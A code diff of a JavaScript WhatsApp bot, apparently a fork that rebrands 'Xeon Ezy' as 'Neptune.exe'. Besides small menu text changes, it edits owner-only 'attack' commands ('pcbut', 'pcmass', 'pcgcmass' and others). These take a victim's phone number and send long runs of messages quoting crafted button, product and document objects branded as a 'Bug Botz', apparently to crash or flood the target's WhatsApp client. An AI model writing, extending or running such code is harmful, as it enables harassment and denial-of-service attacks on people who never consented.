@@ -5104,7 +5104,7 @@ let search = await yts(args.join(" "))
 let teks = '*| YOUTUBE SEARCH |*\n\n Result From '+text+'\n\n'
 let no = 1
 for (let i of search.all) {
-teks += `┏━✪ 🧚‍♀️Queen Alita Youtube Search🧚‍♀️ ✪━\n┃➣│🧚‍♀️ No : ${no++}\n┃➣│🧚‍♀️ Type : ${i.type}\n┃➣│🧚‍♀️ Video ID : ${i.videoId}\n┃➣│🧚‍♀️ Title : ${i.title}\n┃➣│🧚‍♀️ Views : ${i.views}\n┃➣│🧚‍♀️ Duration : ${i.timestamp}\n┃➣│🧚‍♀️ Uploaded On : ${i.ago}\n┃➣│🧚‍♀️ Author : ${i.author.name}\n┃➣│🧚‍♀️ Url : ${i.url}\n\n─────────────────\n\n`
+teks += `┏━✪ 🧚‍♀️Youtube Search🧚‍♀️ ✪━\n┃➣│🧚‍♀️ No : ${no++}\n┃➣│🧚‍♀️ Type : ${i.type}\n┃➣│🧚‍♀️ Video ID : ${i.videoId}\n┃➣│🧚‍♀️ Title : ${i.title}\n┃➣│🧚‍♀️ Views : ${i.views}\n┃➣│🧚‍♀️ Duration : ${i.timestamp}\n┃➣│🧚‍♀️ Uploaded On : ${i.ago}\n┃➣│🧚‍♀️ Author : ${i.author.name}\n┃➣│🧚‍♀️ Url : ${i.url}\n\n─────────────────\n\n`
 }
 NepBotzInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
 }
@@ -5138,8 +5138,7 @@ let buttons = [
 ]
 let buttonMessage = {
 image: { url: images },
-caption: `┏━✪ 🧚‍♀️ GOOGLE IMAGE 🧚‍♀️ ✪━*
-
+caption: `┏━✪ 🧚‍♀️ GOOGLE IMAGE 🧚‍♀️ ✪━
 ┃➣│🧚‍♀️ Query : ${text}
 ┃➣│🧚‍♀️ Media Url : ${images}`,
 footer: `${global.footer}`,
@@ -6007,7 +6006,7 @@ xeonkey.Film(q)
                NepBotzInc.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
 });
 break
-case 'img':
+case 'imgxxx':
 case 'image': {
 	if (isBan) return reply(mess.ban)
 	if (isBanChat) return reply(mess.banChat)
@@ -6106,7 +6105,7 @@ teks += `${i.link}\n`
 teks += `${i.nama}`
 }
 let buttons = [
-{buttonId: `menu`, buttonText: {displayText: 'Menu🥀'}, type: 1}
+{buttonId: `menu`, buttonText: {displayText: 'Menu'}, type: 1}
 ]
 let buttonMessage = {
 image: log0,
@@ -8213,9 +8212,9 @@ case 'pcbut':
                 if (!isCreator) return replay(`${mess.owner}`)
                     if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbut 91xxxxxxxxxx`)
                  buttonvirus = [
-                          {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1},
-  {buttonId: 'xeon', buttonText: {displayText: xeonbutton}, type: 1},
-  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
+                          {buttonId: 'neo', buttonText: {displayText: xeonvirtex}, type: 1},
+  {buttonId: 'neo', buttonText: {displayText: xeonbutton}, type: 1},
+  {buttonId: 'neo', buttonText: {displayText: xeonvirtex}, type: 1}
 ]
                     buttonMsgX = {
                           text: author,
@@ -8289,8 +8288,8 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": xeonmess.imageMessage,
 "productId": "99999999999999",
-"title": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
-"description": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
+"title": `Neptune.exe ☣️ ${xeonbutton} ${xeonbutton}`,
+"description": `Neptune.exe ☣️ ${xeonbutton} ${xeonbutton}`,
 "currencyCode": "IDR",
 "footerText": botname,
 "priceAmount1000": "10000000",
@@ -8355,7 +8354,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `Xeon Ezy☣️${xeonbrutal(prefix)}`,
+"fileName": `Neptune.exe ☣️${xeonbrutal(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -8377,64 +8376,64 @@ case 'pcmass': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:xeonyh1})
             await sleep(30000)
             }
             break
@@ -8453,64 +8452,64 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
             }
             break
@@ -8528,64 +8527,64 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await NepBotzInc.sendMessage(m.chat, {text:"Neptune.exe ☣️"},{quoted:gcmassxeon})
             await sleep(30000)
             reply(mess.success)
             break
@@ -8603,38 +8602,38 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await NepBotzInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
